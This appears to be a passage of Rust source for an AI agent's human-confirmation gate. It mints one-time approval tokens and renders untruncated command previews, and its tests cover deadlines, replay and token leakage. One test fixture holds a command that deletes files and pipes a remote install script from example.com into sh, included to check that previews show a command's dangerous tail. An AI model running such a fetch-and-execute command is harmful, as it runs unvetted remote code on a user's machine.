/// 凭据挡的是「已登录的这个会话能不能替另一次调用作答」。
fn mint_token() -> String {
    let mut buf = [0u8; 32];
    // 内核熵源取不到是系统级故障（Linux 上 getrandom(2) 除了被信号打断
    // 几乎不会失败）。此时 panic 优于回落到可预测的东西：一个「看起来在工作
    // 但凭据可猜」的确认回路，比一个当场崩掉的服务危险得多
    getrandom::fill(&mut buf).expect("内核熵源不可用，拒绝铸造可预测的确认凭据");
    hex::encode(buf)
}

/// 把工具参数渲染成给人看的预览。
///
/// 与 cortexd 的 `live::compact_args` 分开的两个函数，因为它们服务两件不同的事：
/// 那个是给 UI 画一行「动了哪个文件」的摘要，逐值截到 60 字符；这个是用户
/// 据以做安全判断的全部依据，**不能**逐值截断（截掉的正好是命令危险的那一半）。
/// 合成一个函数就必然要在两种需求里选一个，而选哪个都会在另一处出问题。
#[must_use]
pub fn preview_of(arguments: &serde_json::Value) -> String {
    let mut rendered = match arguments.as_object() {
        // 逐行 `键: 值`，而不是压成一行 JSON：用户要读的是命令本身，
        // 转义过的 JSON 字符串里 `\"` 和 `\n` 会把一条命令读成另一条
        Some(obj) => obj
            .iter()
            .map(|(k, v)| {
                let raw = v
                    .as_str()
                    .map_or_else(|| v.to_string(), std::string::ToString::to_string);
                format!("{k}: {raw}")
            })
            .collect::<Vec<_>>()
            .join("\n"),
        None => arguments.to_string(),
    };
    if arguments
        .get("sandbox_permissions")
        .and_then(|v| v.as_str())
        == Some("require_escalated")
    {
        rendered = format!(
            "【本次宿主执行】批准后，此命令将不受 OS 进程沙箱保护；只对本次调用生效。\n\n{rendered}"
        );
    }

    if rendered.chars().count() <= PREVIEW_MAX_CHARS {
        return rendered;
    }
    let head: String = rendered.chars().take(PREVIEW_MAX_CHARS).collect();
    format!(
        "{head}\n…（参数过长已截断，共 {} 字符；未显示的部分同样会被执行）",
        rendered.chars().count()
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn host_request_preview_keeps_accepted_arguments_and_scope() {
        let command = format!("{}END_OF_COMMAND", "x".repeat(5_500));
        let args = serde_json::json!({
            "command": command,
            "sandbox_permissions": "require_escalated",
            "justification": "这条命令需要宿主权限"
        });
        assert!(
            args.to_string().len() <= 6_000,
            "测试覆盖分派允许的请求大小"
        );
        let preview = preview_of(&args);
        assert!(preview.contains("END_OF_COMMAND"), "确认不能隐藏命令尾部");
        assert!(preview.contains("本次宿主执行"), "确认必须明确退出沙箱");
        assert!(
            !preview.contains("已截断"),
            "所有接受的宿主参数必须完整展示"
        );
    }

    #[test]
    fn computer_action_preview_keeps_nested_arguments_at_dispatch_limit() {
        let args = serde_json::json!({
            "frame_id": "frame-123",
            "actions": [{"type": "type_text", "text": format!("{}END_OF_INPUT", "字".repeat(1_800))}],
            "verify": {"kind": "element_value_equals", "value": "验证末尾"}
        });
        assert!(
            args.to_string().len() <= 6_000,
            "测试参数必须能通过分派上限"
        );
        let preview = preview_of(&args);
        assert!(preview.contains("END_OF_INPUT"), "嵌套输入尾部必须可见");
        assert!(preview.contains("验证末尾"), "动作后的验证条件必须可见");
        assert!(
            !preview.contains("已截断"),
            "接受的电脑动作不能截断确认预览"
        );
    }

    fn meta() -> PendingMeta {
        PendingMeta {
            session_id: "s1".into(),
            tool: "shell".into(),
            risk: "execute",
            preview: "command=echo hi".into(),
            scope: None,
            diff: None,
        }
    }

    fn registry(secs: u64) -> Arc<ConfirmRegistry> {
        Arc::new(ConfirmRegistry::new(Duration::from_secs(secs)))
    }

    #[tokio::test(start_paused = true)]
    async fn blocked_event_delivery_cannot_extend_the_confirmation_deadline() {
        let reg = registry(10);
        let pending = reg.open(meta());
        let wait = tokio::spawn(pending.wait_with_delivery(std::future::pending()));
        tokio::task::yield_now().await;
        tokio::time::advance(Duration::from_secs(10)).await;
        assert_eq!(
            wait.await.expect("确认等待任务正常结束"),
            Approval::Unanswered,
            "事件投递受阻时也必须按登记时截止时间结束"
        );
        assert_eq!(reg.len(), 0, "事件投递超时后不能遗留待确认项");
    }

    #[tokio::test(start_paused = true)]
    async fn reconnect_reply_is_received_even_when_event_delivery_is_blocked() {
        let reg = registry(10);
        let pending = reg.open(meta());
        let token = pending.token().to_owned();
        let wait = tokio::spawn(pending.wait_with_delivery(std::future::pending()));
        tokio::task::yield_now().await;
        assert_eq!(
            reg.answer(&token, Approval::Allow),
            AnswerOutcome::Accepted,
            "重连客户端在截止前的答复必须被接收"
        );
        assert_eq!(
            wait.await.expect("确认等待任务正常结束"),
            Approval::Allow,
            "事件投递阻塞不能吞掉重连客户端的有效答复"
        );
    }

    #[tokio::test(start_paused = true)]
    async fn delayed_wait_uses_the_deadline_set_at_registration() {
        let reg = registry(10);
        let p = reg.open(meta());
        // 模拟登记之后发 SSE 或等待调度耽搁，wait 不该重新拿到完整的 10 秒。
        tokio::time::advance(Duration::from_secs(7)).await;
        let wait = p.wait(std::future::pending());
        tokio::pin!(wait);
        assert!(
            futures::poll!(wait.as_mut()).is_pending(),
            "登记后只过了 7 秒，确认还不该到期"
        );
        let got = tokio::time::timeout(Duration::from_secs(4), wait)
            .await
            .expect("等待必须在登记后的截止时间结束，不能从 wait 重新计时");
        assert_eq!(got, Approval::Unanswered, "无人答复到期后必须拒绝");
        assert_eq!(reg.len(), 0, "超时后的待办项必须清理");
    }

    #[tokio::test(start_paused = true)]
    async fn wait_started_after_deadline_refuses_without_a_new_window() {
        let reg = registry(10);
        let p = reg.open(meta());
        tokio::time::advance(Duration::from_secs(11)).await;
        let got = tokio::time::timeout(Duration::from_millis(100), p.wait(std::future::pending()))
            .await
            .expect("开始等待时已经过期，不能再等一个完整的超时周期");
        assert_eq!(got, Approval::Unanswered, "到期未答必须按拒绝处理");
        assert_eq!(reg.len(), 0, "延迟启动的等待结束后不能留下幽灵记录");
    }

    #[tokio::test(start_paused = true)]
    async fn a_reply_at_deadline_is_unknown_even_before_wait_starts() {
        let reg = registry(10);
        let p = reg.open(meta());
        let token = p.token().to_string();
        tokio::time::advance(Duration::from_secs(10)).await;
        assert_eq!(
            reg.answer(&token, Approval::Allow),
            AnswerOutcome::Unknown,
            "恰好到期的允许回执必须与不存在的凭据一样被拒绝"
        );
        assert!(
            reg.pending(None).is_empty(),
            "到达截止时间后，重连列表不能再交出已经失效的凭据"
        );
        assert_eq!(
            p.wait(std::future::pending()).await,
            Approval::Unanswered,
            "等待方启动得晚，也不能收到过期的允许回执"
        );
    }

    #[tokio::test(start_paused = true)]
    async fn late_reply_is_rejected_when_the_waiter_has_not_processed_its_timer() {
        let reg = registry(10);
        let p = reg.open(meta());
        let token = p.token().to_string();
        let wait = p.wait(std::future::pending());
        tokio::pin!(wait);
        assert!(
            futures::poll!(wait.as_mut()).is_pending(),
            "先让等待方登记定时器，再模拟它迟迟没有获得调度"
        );
        tokio::time::advance(Duration::from_secs(11)).await;
        assert_eq!(
            reg.answer(&token, Approval::Allow),
            AnswerOutcome::Unknown,
            "即使等待方还没处理定时器，截止后的允许也不能被接受"
        );
        assert_eq!(
            wait.await,
            Approval::Unanswered,
            "恢复调度时不能把截止后的回执当成批准"
        );
    }

    #[tokio::test(start_paused = true)]
    async fn a_reply_accepted_before_deadline_survives_a_delayed_wait() {
        let reg = registry(10);
        let p = reg.open(meta());
        tokio::time::advance(Duration::from_secs(9)).await;
        assert_eq!(
            reg.answer(p.token(), Approval::Allow),
            AnswerOutcome::Accepted,
            "截止前的有效回执应当被收下"
        );
        tokio::time::advance(Duration::from_secs(2)).await;
        assert_eq!(
            p.wait(std::future::pending()).await,
            Approval::Allow,
            "不能因为等待方到截止后才获调度，就丢掉已接受的回执"
        );
    }

    #[tokio::test(start_paused = true)]
    async fn accepted_reply_wins_when_the_waiter_and_timer_are_both_ready() {
        let reg = registry(10);
        let p = reg.open(meta());
        let token = p.token().to_string();
        let wait = p.wait(std::future::pending());
        tokio::pin!(wait);
        assert!(futures::poll!(wait.as_mut()).is_pending(), "先让等待方挂起");
        tokio::time::advance(Duration::from_secs(9)).await;
        assert_eq!(
            reg.answer(&token, Approval::Allow),
            AnswerOutcome::Accepted,
            "截止前的回执必须被接受"
        );
        tokio::time::advance(Duration::from_secs(2)).await;
        assert_eq!(
            wait.await,
            Approval::Allow,
            "答复与定时器同时就绪时，不能丢掉截止前已接受的答复"
        );
    }

    #[tokio::test(start_paused = true)]
    async fn expiry_keeps_session_filtering_and_unknown_errors_compatible() {
        let reg = registry(10);
        let expired = reg.open(meta());
        tokio::time::advance(Duration::from_secs(5)).await;
        let mut other_meta = meta();
        other_meta.session_id = "s2".into();
        let other = reg.open(other_meta);
        let other_token = other.token().to_string();
        tokio::time::advance(Duration::from_secs(5)).await;

        assert!(reg.pending(Some("s1")).is_empty(), "过期项不能出现在原会话");
        let list = reg.pending(Some("s2"));
        assert_eq!(list.len(), 1, "另一个会话里尚未到期的确认必须仍然可见");
        assert_eq!(list[0].token, other_token, "会话过滤不能串到别人的待办");
        assert_eq!(reg.pending(None).len(), 1, "未指定会话时也不能列出过期项");

        let unknown = reg.answer("forged-token", Approval::Allow);
        assert_eq!(unknown, AnswerOutcome::Unknown, "伪造凭据必须返回 Unknown");
        assert_eq!(
            reg.answer(expired.token(), Approval::Allow),
            unknown,
            "过期与伪造必须给出相同的不可探测结果"
        );
        assert_eq!(
            reg.answer(&other_token, Approval::Denied),
            AnswerOutcome::Accepted,
            "处理过期项不能影响另一会话仍有效的凭据"
        );
        assert_eq!(
            reg.answer(&other_token, Approval::Allow),
            unknown,
            "已消费与伪造也必须不可区分"
        );
        assert_eq!(
            other.wait(std::future::pending()).await,
            Approval::Denied,
            "回执只能交给登记了该凭据的那一轮"
        );
        assert_eq!(
            expired.wait(std::future::pending()).await,
            Approval::Unanswered,
            "过期项不能被其他会话的回执批准"
        );
    }

    #[tokio::test]
    async fn accepted_reply_is_not_lost_when_cancellation_wins_select() {
        let reg = registry(30);
        let p = reg.open(meta());
        let token = p.token().to_string();
        let answering_reg = Arc::clone(&reg);
        // biased select 会先看到 rx 未就绪；接着 poll 此 future 时才投递答复，
        // 然后它立即就绪。若取消分支直接返回，就会出现 Accepted + Unanswered。
        let cancelled = async move {
            assert_eq!(
                answering_reg.answer(&token, Approval::Allow),
                AnswerOutcome::Accepted,
                "收到成功回执就必须保证等待方能取得这个答复"
            );
        };
        assert_eq!(
            p.wait(cancelled).await,
            Approval::Allow,
            "已接受的答复不能被同时就绪的取消分支吞掉"
        );
    }

    #[test]
    fn timeout_and_cancellation_logs_do_not_contain_confirmation_tokens() {
        const CHILD_ENV: &str = "CORTEX_TEST_CONFIRM_LOG_CAPTURE_CHILD";
        if std::env::var_os(CHILD_ENV).is_none() {
            // tracing 的 callsite 兴趣缓存由进程内所有 subscriber 共用；并行测试
            // 切换 subscriber 时，线程本地采集器可能错过事件。独立进程验证真实
            // 日志，不依赖测试运行器的并发顺序，也不改变其他测试的全局配置。
            let output = std::process::Command::new(std::env::current_exe().expect("测试程序路径"))
                .args([
                    "confirm::tests::timeout_and_cancellation_logs_do_not_contain_confirmation_tokens",
                    "--exact",
                    "--nocapture",
                ])
                .env(CHILD_ENV, "1")
                .output()
                .expect("启动隔离日志验证进程");
            assert!(
                output.status.success(),
                "隔离日志验证失败：{} {}",
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)
            );
            return;
        }
        use std::fmt::Debug;
        use tracing::field::{Field, Visit};
        use tracing::span::{Attributes, Id, Record};
        use tracing::{Event, Metadata, Subscriber};

        struct Capture(Arc<Mutex<String>>);
        struct Fields<'a>(&'a mut String);

        impl Visit for Fields<'_> {
            fn record_debug(&mut self, field: &Field, value: &dyn Debug) {
                self.0.push_str(field.name());
                self.0.push_str(&format!("={value:?};"));
            }
        }

        impl Subscriber for Capture {
            fn enabled(&self, _: &Metadata<'_>) -> bool {
                true
            }
            fn new_span(&self, _: &Attributes<'_>) -> Id {
                Id::from_u64(1)
            }
            fn record(&self, _: &Id, _: &Record<'_>) {}
            fn record_follows_from(&self, _: &Id, _: &Id) {}
            fn event(&self, event: &Event<'_>) {
                let mut log = self.0.lock().expect("日志收集锁不该中毒");
                event.record(&mut Fields(&mut log));
            }
            fn enter(&self, _: &Id) {}
            fn exit(&self, _: &Id) {}
        }

        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_time()
            .start_paused(true)
            .build()
            .expect("创建虚拟时钟运行时");
        runtime.block_on(async {
            let captured = Arc::new(Mutex::new(String::new()));
            let _subscriber = tracing::subscriber::set_default(Capture(Arc::clone(&captured)));
            let reg = registry(1);
            let timeout = reg.open(meta());
            let timeout_token = timeout.token().to_string();
            assert_eq!(
                timeout.wait(std::future::pending()).await,
                Approval::Unanswered
            );
            let cancelled = reg.open(meta());
            let cancelled_token = cancelled.token().to_string();
            assert_eq!(
                cancelled.wait(std::future::ready(())).await,
                Approval::Unanswered
            );
            let log = captured.lock().expect("日志收集锁不该中毒");
            assert!(log.contains("工具确认超时"), "必须实际捕获到超时日志");
            assert!(log.contains("确认期间客户端断开"), "必须实际捕获到取消日志");
            assert!(
                !log.contains(&timeout_token) && !log.contains(&cancelled_token),
                "确认 token 是一次性凭据，不应写进任何等待路径日志"
            );
        });
    }

    #[tokio::test]
    async fn simultaneous_devices_cannot_both_consume_a_token() {
        let reg = registry(30);
        let p = reg.open(meta());
        let token = p.token().to_string();
        let barrier = std::sync::Barrier::new(3);
        let (allow, deny) = std::thread::scope(|scope| {
            let barrier_ref = &barrier;
            let reg_ref = &reg;
            let token_ref = token.as_str();
            let allow = scope.spawn(move || {
                barrier_ref.wait();
                reg_ref.answer(token_ref, Approval::Allow)
            });
            let deny = scope.spawn(move || {
                barrier_ref.wait();
                reg_ref.answer(token_ref, Approval::Denied)
            });
            barrier.wait();
            (
                allow.join().expect("允许回执线程不应 panic"),
                deny.join().expect("拒绝回执线程不应 panic"),
            )
        });
        let expected = match (allow, deny) {
            (AnswerOutcome::Accepted, AnswerOutcome::Unknown) => Approval::Allow,
            (AnswerOutcome::Unknown, AnswerOutcome::Accepted) => Approval::Denied,
            _ => panic!("并发回执必须恰有一个被接受：{allow:?} / {deny:?}"),
        };
        assert_eq!(
            p.wait(std::future::pending()).await,
            expected,
            "等待方必须收到实际被接受的那个答复"
        );
    }

    #[tokio::test]
    async fn an_answer_reaches_the_waiting_turn() {
        let reg = registry(30);
        let p = reg.open(meta());
        let token = p.token().to_string();
        let reg2 = Arc::clone(&reg);
        tokio::spawn(async move {
            assert_eq!(
                reg2.answer(&token, Approval::Allow),
                AnswerOutcome::Accepted
            );
        });
        assert_eq!(p.wait(std::future::pending()).await, Approval::Allow);
    }

    #[tokio::test]
    async fn a_denial_reaches_the_waiting_turn() {
        let reg = registry(30);
        let p = reg.open(meta());
        reg.answer(p.token(), Approval::Denied);
        assert_eq!(p.wait(std::future::pending()).await, Approval::Denied);
    }

    /// 超时必须是**拒绝**，不是放行。这条断言守的是本模块最重要的一个决定。
    #[tokio::test(start_paused = true)]
    async fn silence_is_a_refusal_not_an_approval() {
        let reg = registry(2);
        let p = reg.open(meta());
        let got = p.wait(std::future::pending()).await;
        assert_eq!(
            got,
            Approval::Unanswered,
            "没人回答时必须按拒绝处理 —— 放行意味着关掉页面就等于交出 shell"
        );
    }

    #[tokio::test]
    async fn a_disconnected_client_ends_the_wait_immediately() {
        let reg = registry(3600); // 超时长到不可能是它救的场
        let p = reg.open(meta());
        let got = p.wait(std::future::ready(())).await;
        assert_eq!(got, Approval::Unanswered);
    }

    /// 一个 token 只能用一次 —— 重放不能批准第二次调用。
    #[tokio::test]
    async fn a_token_is_consumed_by_the_first_answer() {
        let reg = registry(30);
        let p = reg.open(meta());
        let token = p.token().to_string();
        assert_eq!(reg.answer(&token, Approval::Allow), AnswerOutcome::Accepted);
        assert_eq!(
            reg.answer(&token, Approval::Allow),
            AnswerOutcome::Unknown,
            "同一个凭据不能批准第二次"
        );
    }

    /// 多端同时答：先到的作数，晚到的拿到 Unknown 而不是静默成功。
    #[tokio::test]
    async fn the_first_device_to_answer_wins() {
        let reg = registry(30);
        let p = reg.open(meta());
        let token = p.token().to_string();
        let first = reg.answer(&token, Approval::Denied);
        let second = reg.answer(&token, Approval::Allow);
        assert_eq!(first, AnswerOutcome::Accepted);
        assert_eq!(
            second,
            AnswerOutcome::Unknown,
            "第二台设备必须知道自己的答复没有生效，而不是以为批准了"
        );
        assert_eq!(
            p.wait(std::future::pending()).await,
            Approval::Denied,
            "生效的应当是先到的那个答复"
        );
    }

    #[tokio::test]
    async fn a_forged_token_is_indistinguishable_from_an_expired_one() {
        let reg = registry(30);
        assert_eq!(
            reg.answer("deadbeef", Approval::Allow),
            AnswerOutcome::Unknown
        );
    }

    /// 等待结束后待办项必须从簿子上消失，否则列表里会堆满没人在等的幽灵。
    #[tokio::test(start_paused = true)]
    async fn a_finished_wait_leaves_no_ghost_entry() {
        let reg = registry(1);
        {
            let p = reg.open(meta());
            assert_eq!(reg.len(), 1);
            assert_eq!(reg.pending(None).len(), 1);
            assert_eq!(reg.pending(Some("别的会话")).len(), 0, "应当能按会话过滤");
            let _ = p.wait(std::future::pending()).await;
        }
        assert_eq!(reg.len(), 0, "超时之后待办项必须被划掉");
    }

    #[tokio::test]
    async fn pending_lists_what_a_reconnecting_client_needs() {
        let reg = registry(30);
        let p = reg.open(meta());
        let list = reg.pending(Some("s1"));
        assert_eq!(list.len(), 1);
        assert_eq!(list[0].token, p.token());
        assert_eq!(list[0].tool, "shell");
        assert!(
            list[0].preview.contains("echo hi"),
            "预览里必须有用户据以判断的内容"
        );
        assert!(list[0].expires_in_secs > 0 && list[0].expires_in_secs <= 30);
    }

    #[test]
    fn tokens_are_long_and_never_repeat() {
        let a = mint_token();
        let b = mint_token();
        assert_eq!(a.len(), 64, "256 位十六进制应当是 64 个字符");
        assert_ne!(a, b);
        assert!(a.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn preview_truncation_is_visible() {
        let long = "x".repeat(PREVIEW_MAX_CHARS * 2);
        let out = preview_of(&serde_json::json!({ "command": long }));
        assert!(
            out.contains("已截断"),
            "截断必须看得见 —— 用户不能在不知道自己没看全的情况下点允许"
        );
        assert!(out.chars().count() <= PREVIEW_MAX_CHARS + 64);
    }

    /// 现实长度的命令必须**一字不落**地给用户看。
    ///
    /// 这条命令有意超过 60 个字符 —— 那正是工具事件里 `compact_args` 的逐值
    /// 上限。有人把这两个渲染合并成一个函数时，被截掉的恰好是
    /// `| sh` 那一半，而用户批准的就是他没看见的那一半。
    #[test]
    fn preview_keeps_the_whole_of_a_realistic_command() {
        let cmd = "rm -rf /tmp/build-cache && curl -sSfL https://example.com/install.sh | sh -s -- --force";
        assert!(
            cmd.len() > 60,
            "这条测试命令必须长过 compact_args 的逐值上限"
        );
        let out = preview_of(&serde_json::json!({ "command": cmd }));
        assert!(
            out.contains("| sh -s -- --force"),
            "现实长度的命令必须一字不落地给用户看，实际：{out}"
        );
    }
}
